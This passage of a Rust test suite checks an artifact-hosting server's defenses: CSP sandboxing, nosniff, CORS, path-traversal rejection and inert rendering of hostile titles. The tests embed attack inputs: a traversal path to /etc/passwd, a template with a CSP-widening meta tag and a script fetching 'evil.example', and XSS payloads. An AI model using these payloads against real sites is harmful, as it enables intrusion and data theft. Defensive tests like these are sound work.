    }

    fn demo_like_space() -> Space {
        let mut s = Space::default();
        s.artifacts.insert(
            "index".to_string(),
            Artifact {
                html: "<!doctype html><h1>Live home</h1>".into(),
                title: "Live Home".into(),
            },
        );
        s.artifacts.insert(
            "sales".to_string(),
            Artifact {
                html: "<!doctype html><h1>Sales</h1>".into(),
                title: "Sales".into(),
            },
        );
        s.assets.insert(
            "assets/data.json".to_string(),
            Asset {
                content_type: "application/json; charset=utf-8",
                bytes: b"{\"ok\":true}".to_vec(),
            },
        );
        s.nav = vec!["index".into(), "sales".into()];
        s.home = Some("index".into());
        s
    }

    #[tokio::test]
    async fn live_space_serves_its_own_artifacts_not_fixtures() {
        let host = host_with_space("myspace", demo_like_space());
        let resp = get_on(host.clone(), "/myspace/_c/index").await;
        assert_eq!(resp.status(), StatusCode::OK);
        assert!(body_string(resp).await.contains("Live home"));
        // A live space that lacks a slug 404s — it must NOT leak demo fixtures.
        assert_eq!(
            get_on(host, "/myspace/_c/exfil").await.status(),
            StatusCode::NOT_FOUND
        );
    }

    #[tokio::test]
    async fn live_shell_shows_resolved_title_as_text() {
        let host = host_with_space("myspace", demo_like_space());
        let html = body_string(get_on(host, "/myspace/sales").await).await;
        assert!(html.contains("Sales"));
        assert!(html.contains("/myspace/_c/sales"));
    }

    #[tokio::test]
    async fn asset_route_serves_with_mime_nosniff_and_sandbox() {
        let host = host_with_space("myspace", demo_like_space());
        let resp = get_on(host, "/myspace/assets/data.json").await;
        assert_eq!(resp.status(), StatusCode::OK);
        assert!(header(&resp, "content-type").contains("application/json"));
        assert_eq!(header(&resp, "x-content-type-options"), "nosniff");
        // A hostile top-level asset document is sandboxed (script-less null origin).
        assert_eq!(header(&resp, "content-security-policy"), "sandbox");
        // No wildcard CORS — a foreign origin must not be able to read the asset.
        assert_eq!(header(&resp, "access-control-allow-origin"), "");
    }

    #[tokio::test]
    async fn asset_route_rejects_traversal_and_unknown() {
        let host = host_with_space("myspace", demo_like_space());
        // Real asset present.
        assert_eq!(
            get_on(host.clone(), "/myspace/assets/data.json")
                .await
                .status(),
            StatusCode::OK
        );
        // Traversal attempts never resolve to a key in the pre-scanned map.
        assert_eq!(
            get_on(host.clone(), "/myspace/assets/..%2f..%2fetc%2fpasswd")
                .await
                .status(),
            StatusCode::NOT_FOUND
        );
        assert_eq!(
            get_on(host.clone(), "/myspace/assets/nope.json")
                .await
                .status(),
            StatusCode::NOT_FOUND
        );
        // Unknown space → 404 (no fixtures have assets either).
        assert_eq!(
            get_on(host, "/demo/assets/x.js").await.status(),
            StatusCode::NOT_FOUND
        );
    }

    #[tokio::test]
    async fn atomic_swap_never_serves_a_partial_snapshot() {
        // Alternate between two complete snapshots from another thread while the
        // main thread reads; every read must be wholly one snapshot or the other.
        let host = Arc::new(ArtifactHost::new(3000));
        let mk = |body: &str| {
            let mut s = Space::default();
            s.artifacts.insert(
                "index".into(),
                Artifact {
                    html: body.to_string(),
                    title: "t".into(),
                },
            );
            s.nav = vec!["index".into()];
            s.home = Some("index".into());
            let mut snap = Snapshot::empty();
            snap.spaces.insert("myspace".into(), s);
            snap
        };
        let a = "AAAAAAAA";
        let b = "BBBBBBBB";
        host.swap(mk(a));
        let writer = {
            let host = host.clone();
            let (a, b) = (a.to_string(), b.to_string());
            std::thread::spawn(move || {
                for i in 0..2000 {
                    host.swap(mk(if i % 2 == 0 { &a } else { &b }));
                }
            })
        };
        for _ in 0..2000 {
            let snap = host.snapshot();
            let html = &snap
                .space("myspace")
                .unwrap()
                .artifact("index")
                .unwrap()
                .html;
            assert!(html == a || html == b, "torn snapshot: {html:?}");
        }
        writer.join().unwrap();
    }

    // --- markdown-template-render: the render path is served like any artifact --

    /// Build a one-space snapshot whose `index` artifact body is `body` (as a
    /// `render`ed markdown+template output would produce), with a resolved title.
    fn host_with_rendered_body(body: &str) -> Arc<ArtifactHost> {
        let title = space::resolve_title(body).unwrap_or_else(|| "r".to_string());
        let mut sp = Space::default();
        sp.artifacts.insert(
            "index".to_string(),
            Artifact {
                html: body.to_string(),
                title,
            },
        );
        sp.nav = vec!["index".into()];
        sp.home = Some("index".into());
        host_with_space("r", sp)
    }

    #[tokio::test]
    async fn rendered_markdown_artifact_is_wrapped_and_sandboxed() {
        // A rendered prose fragment is served exactly like a `create`d fragment:
        // wrapped (doctype + base.css + bridge) under the frozen artifact CSP.
        let body = render::render_to_body(
            "# Hello\n\nA para.\n",
            render::builtin_template("prose").unwrap(),
        )
        .unwrap();
        let host = host_with_rendered_body(&body);
        let resp = get_on(host, "/r/_c/index").await;
        assert_eq!(resp.status(), StatusCode::OK);
        let csp = header(&resp, "content-security-policy");
        assert!(csp.starts_with("sandbox allow-scripts"), "csp: {csp}");
        assert!(csp.contains("connect-src 'none'"), "egress open: {csp}");
        let html = body_string(resp).await;
        assert!(html.starts_with("<!doctype html>"));
        assert!(html.contains(r#"<link rel="stylesheet" href="/_gp/v1/base.css">"#));
        assert!(html.contains(r#"<script src="/_gp/v1/bridge.js" defer></script>"#));
        // The prose render contract: rendered blocks are children of .gp-prose.
        assert!(html.contains(r#"<article class="gp-prose">"#));
        assert!(html.contains("<h1>Hello</h1>"));
    }

    #[tokio::test]
    async fn hostile_template_body_cannot_widen_csp() {
        // A template/markdown that tries to widen CSP (a <meta http-equiv> tag), run
        // arbitrary script, or break out of the body (a stray </body></html>) must
        // NOT change the response's CSP: the header is set server-side per response,
        // independent of body bytes — so a template fails CLOSED at the boundary.
        let hostile_template = concat!(
            "<meta http-equiv=\"Content-Security-Policy\" content=\"default-src *; connect-src *\">",
            "<script>fetch('http://evil.example/x')</script>",
            "<main>{{content}}</main></body></html>",
        );
        let body = render::render_to_body(
            "text with a `<script>alert(1)</script>` inline",
            hostile_template,
        )
        .unwrap();
        let host = host_with_rendered_body(&body);
        let resp = get_on(host, "/r/_c/index").await;
        let csp = header(&resp, "content-security-policy");
        // The frozen artifact contract is intact: sandbox on, egress fully closed.
        assert!(csp.starts_with("sandbox allow-scripts"), "csp: {csp}");
        assert!(csp.contains("connect-src 'none'"), "egress widened: {csp}");
        // The body's attempted widening never reached the actual CSP *header*.
        assert!(!csp.contains("default-src *"), "meta widened header: {csp}");
        assert!(!csp.contains("connect-src *"), "meta widened header: {csp}");
    }

    #[tokio::test]
    async fn rendered_hostile_heading_is_inert_in_shell() {
        // A markdown body whose heading is hostile becomes the artifact title; the
        // trusted shell must still render it inert (textContent / JSON-for-script),
        // never as executable markup — the template/markdown can't inject the shell.
        let body = render::render_to_body(
            "# Report <img src=x onerror=alert(1)>\n",
            render::builtin_template("prose").unwrap(),
        )
        .unwrap();
        // Route the body through the real snapshot builder so the title resolves the
        // same way `render` (via one_artifact_snapshot) does.
        let snap = crate::server::one_artifact_snapshot("r", body);
        let host = Arc::new(ArtifactHost::new(3000));
        host.swap(snap);
        // The sandboxed artifact body DOES carry the raw markup (passthrough is fine —
        // it is inert in the null-origin sandbox under the frozen CSP)…
        let content = body_string(get_on(host.clone(), "/r/_c/index").await).await;
        assert!(
            content.contains("<img src=x onerror"),
            "body should pass markup through"
        );
        // …but the trusted shell (a different route, built from the resolved title
        // via textContent / JSON-for-script) never emits that raw markup.
        let shell = body_string(get_on(host, "/r/index").await).await;
        assert!(
            !shell.contains("<img src=x onerror"),
            "shell injection: title raw"
        );
    }

    #[tokio::test]
    async fn reload_endpoint_is_event_stream() {
        let resp = get("/_gp/reload").await;
        assert_eq!(resp.status(), StatusCode::OK);
        assert!(header(&resp, "content-type").contains("text/event-stream"));
    }

    #[test]
    fn notify_round_and_reload_carry_distinct_keyed_events() {
        // B2: the one reload carrier multiplexes a full-reload signal and a keyed
        // round-swap signal. A subscriber sees `Reload` for the dev file-watch and
        // `Round{space, content_version, round}` for a multi-round push — the round
        // event is space-keyed so a shell can ignore rounds for other pages.
        let host = empty_host();
        let mut rx = host.subscribe();
        host.notify_reload();
        assert!(matches!(rx.try_recv(), Ok(ReloadEvent::Reload)));
        host.notify_round("myspace", "deadbeefdeadbeef", 3);
        match rx.try_recv() {
            Ok(ReloadEvent::Round {
                space,
                content_version,
                round,
            }) => {
                assert_eq!(space, "myspace");
                assert_eq!(content_version, "deadbeefdeadbeef");
                assert_eq!(round, 3);
            }
            other => panic!("expected a keyed Round event, got {other:?}"),
        }
    }
}
